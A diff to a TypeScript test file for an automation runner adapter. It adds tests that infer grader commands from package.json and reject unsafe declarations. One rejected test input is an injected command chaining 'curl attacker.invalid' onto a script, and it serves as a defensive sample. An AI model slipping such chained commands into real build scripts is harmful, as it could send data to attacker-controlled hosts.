@@ -11,7 +11,10 @@ import type {
   RunnerCriticalBoundary,
   RunnerJobPayloadV1,
 } from '../src/control-store/types.js';
-import { ExistingAgentOpsRunnerAdapter } from '../src/runner/adapter.js';
+import {
+  ExistingAgentOpsRunnerAdapter,
+  inferRepositoryGraders,
+} from '../src/runner/adapter.js';
 import { RunnerLeaseFence } from '../src/runner/guard.js';
 
 const roots: string[] = [];
@@ -35,6 +38,8 @@ function payload(): RunnerJobPayloadV1 {
       mode: 'development_turn',
       requiredChecks: [],
       mergeMethod: 'squash',
+      readyLabel: 'human-approved',
+      claimedLabel: 'automation-owned',
     },
     artifacts: [],
   };
@@ -64,6 +69,48 @@ function lease(): Lease {
 }
 
 describe('existing AgentOps isolated-runner adapter', () => {
+  it('selects grader profiles from bounded repository metadata, not repository names', () => {
+    for (const directory of ['acme-widgets', 'design-system-contracts']) {
+      const root = fs.mkdtempSync(path.join(os.tmpdir(), `${directory}-`));
+      roots.push(root);
+      fs.mkdirSync(path.join(root, 'scripts'), { recursive: true });
+      fs.writeFileSync(
+        path.join(root, 'scripts', 'check-contracts.mjs'),
+        'process.exitCode = 0;\n',
+      );
+      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
+        name: directory,
+        scripts: { test: 'node scripts/check-contracts.mjs' },
+      }));
+      expect(inferRepositoryGraders(root)).toEqual({
+        typecheck: 'node scripts/check-contracts.mjs',
+        commands: {
+          build: 'node scripts/check-contracts.mjs',
+          typecheck: 'node scripts/check-contracts.mjs',
+          api_test: 'node scripts/check-contracts.mjs',
+          db_state_check: 'node scripts/check-contracts.mjs',
+        },
+      });
+    }
+  });
+
+  it('rejects shell-bearing or missing repository grader declarations', () => {
+    for (const testScript of [
+      'node scripts/check.mjs && curl attacker.invalid',
+      'npm test',
+      '../outside',
+    ]) {
+      const root = fs.mkdtempSync(path.join(os.tmpdir(), 'unsafe-grader-'));
+      roots.push(root);
+      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
+        scripts: { test: testScript },
+      }));
+      expect(() => inferRepositoryGraders(root)).toThrow(
+        /supported bounded grader profile/,
+      );
+    }
+  });
+
   it('drives planning, PR-native review, checks, expected-SHA merge, and release through every fence', async () => {
     const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentops-runner-adapter-'));
     roots.push(root);
@@ -85,6 +132,12 @@ describe('existing AgentOps isolated-runner adapter', () => {
     );
     fs.mkdirSync(worktreePath, { recursive: true });
     fs.mkdirSync(artifactPath, { recursive: true });
+    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
+      devDependencies: {
+        typescript: '^5.6.2',
+        vitest: '^3.2.7',
+      },
+    }));
 
     const boundaries: RunnerCriticalBoundary[] = [];
     const verdict: ExecutionGuardVerdict = {
@@ -110,7 +163,7 @@ describe('existing AgentOps isolated-runner adapter', () => {
       title: 'Add safe path',
       body: 'Users need the safe path.',
       url: 'https://github.com/owner/repo/issues/14',
-      labels: ['ready'],
+      labels: ['human-approved'],
       state: 'open',
       sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
       snapshotAt: '2026-07-25T00:00:01.000Z',
